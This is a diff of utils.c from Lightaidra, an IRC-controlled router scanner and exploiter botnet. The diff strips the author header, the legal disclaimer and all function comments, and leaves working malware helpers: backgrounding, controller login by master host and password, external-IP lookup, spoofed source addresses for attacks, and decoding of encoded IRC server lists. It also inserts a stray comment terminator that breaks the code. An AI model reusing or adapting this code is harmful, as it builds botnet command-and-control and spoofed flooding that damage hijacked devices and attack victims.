@@ -1,30 +1,13 @@
-/*
- * utils.c - USE LIGHTAIDRA AT YOUR OWN RISK!
- *
- * Lightaidra - IRC-based mass router scanner/exploiter.
- * Copyright (C) 2008-2015 Federico Fazzi, <eurialo@deftcode.ninja>.
- *
- * LEGAL DISCLAIMER: It is the end user's responsibility to obey 
- * all applicable local, state and federal laws. Developers assume 
- * no liability and are not responsible for any misuse or damage 
- * caused by this program.
- *
- */
-
 #include "../include/headers.h"
 
 void __alarm();
 void decode();
 
-/* daemonize(void)               */
-/* set Aidra in background mode. */
 void daemonize() {
     daemonize_pid = fork();
     if (daemonize_pid) exit(EXIT_SUCCESS);
 }
 
-/* sockwrite(int, const char *) */
-/* socket send function.        */
 int sockwrite(int sd, const char *fmt, ...) {
     char s_buf[sizebuf];
     va_list args;
@@ -38,8 +21,6 @@ int sockwrite(int sd, const char *fmt, ...) {
     return EXIT_SUCCESS;
 }
 
-/* getrstr(void)                */
-/* return a random char string. */
 char *getrstr() {
     char rdnick[] = { "0ab1cd2ef3gh4il5mn6op7qr8st9uvz_wyjkx" };
     char nm[16];
@@ -58,8 +39,6 @@ char *getrstr() {
     return data_ptr;
 }
 
-/* wordcmp(const char *, requests_t *) */
-/* a menu strncmp function.            */
 int wordcmp(const char *s, requests_t *req) {
     if (strlen(req->rcv_sa)) {
         if (strncmp(req->rcv_sa, s, strlen(s)) == true && strlen(req->rcv_sa) == strlen(s))
@@ -69,8 +48,6 @@ int wordcmp(const char *s, requests_t *req) {
     return EXIT_FAILURE;
 }
 
-/* wordcmp(const char *, requests_t *) */
-/* a menu strncmp function.            */
 int wordcmpp(const char *s, requests_t *req) {
     if (strlen(req->rcv_sa) == strlen(s)+1) {
         if (strcmp(req->rcv_sa, s)) return EXIT_SUCCESS;
@@ -79,15 +56,11 @@ int wordcmpp(const char *s, requests_t *req) {
     return EXIT_FAILURE;
 }
 
-/* twordcmp(const char *, requests_t *) */
-/* a topic strncmp function.            */
 int twordcmp(const char *s, requests_t *req) {
     if (strncmp(s, req->rcv_sb, strlen(s)) == true) return EXIT_SUCCESS;
     return EXIT_FAILURE;
 }
 
-/* login(sock_t *, requests_t *) */
-/* log in party-line bot.        */
 int login(sock_t *sp, requests_t *req) {
     if (strstr(req->rcv_a, master_host)) {
         if (strncmp(master_password, req->rcv_sb, strlen(master_password)) == true) {
@@ -102,16 +75,12 @@ int login(sock_t *sp, requests_t *req) {
     return EXIT_FAILURE;
 }
 
-/* login_control(requests_t *)   */
-/* check if user is logged in.   */
 int login_control(requests_t *req) {
     if (strstr(req->rcv_a, master_host)) return EXIT_SUCCESS;
     
     return EXIT_FAILURE;
 }
 
-/* getextip(sock_t *, requests_t *) */
-/* get extern ip address.                */
 int getextip(sock_t *sp, requests_t *req) {
     int a, b, x = 0;
     char temp[512], *tok;
@@ -163,9 +132,6 @@ int getextip(sock_t *sp, requests_t *req) {
     return EXIT_FAILURE;
 }
 
-/* in_cksum(unsigned short *, int)       */
-/* create a checksum for ipheader.       */
-/* i've found that function with google. */
 unsigned short in_cksum(unsigned short *ptr, int nbytes) {
     register long sum;
     u_short oddbyte;
@@ -191,9 +157,6 @@ unsigned short in_cksum(unsigned short *ptr, int nbytes) {
     return answer;
 }
 
-/* host2ip(char *)                       */
-/* convert hostname to ip address.       */
-/* i've found that function with google. */
 unsigned int host2ip(char *hostname) {
 
     static struct in_addr i;
@@ -212,8 +175,6 @@ unsigned int host2ip(char *hostname) {
     return i.s_addr;
 }
 
-/* parse_input_errors(sock_t *, requests_t *) */
-/* check for input errors.                    */
 int parse_input_errors(sock_t *sp, requests_t *req, 
 unsigned short argn, unsigned short et) {
     int x = 0, y = 0;
@@ -251,8 +212,6 @@ unsigned short argn, unsigned short et) {
     return EXIT_SUCCESS;
 }
 
-/* create_irc_servlist()      */
-/* create a irc servers list. */
 void create_irc_servlist() {
     unsigned short x = 0;
     char s_copy[512], *token;
@@ -281,8 +240,6 @@ void create_irc_servlist() {
     return;
 }
 
-/* get_spoofed_addr()                    */
-/* return a spoofed address for attacks. */
 unsigned int get_spoofed() {
     char spa[21];
     int a, b, c, d;
@@ -310,8 +267,6 @@ unsigned int get_spoofed() {
     return ((unsigned int)host2ip(spa));
 }
 
-/* pidprocess()     */
-/* check for clones */
 void pidprocess() {
     FILE *pidfd;
     unsigned int pidc;
@@ -332,10 +287,7 @@ void pidprocess() {
 
     return;
 }
-
-/* decode()                         */
-/* a function to decode irc servers */
-/* encoded by ircencode.c tool      */
+  */
 void decode(char *str, int dtype) {
     char decoded[512];
     int x = 0, i = 0, c;
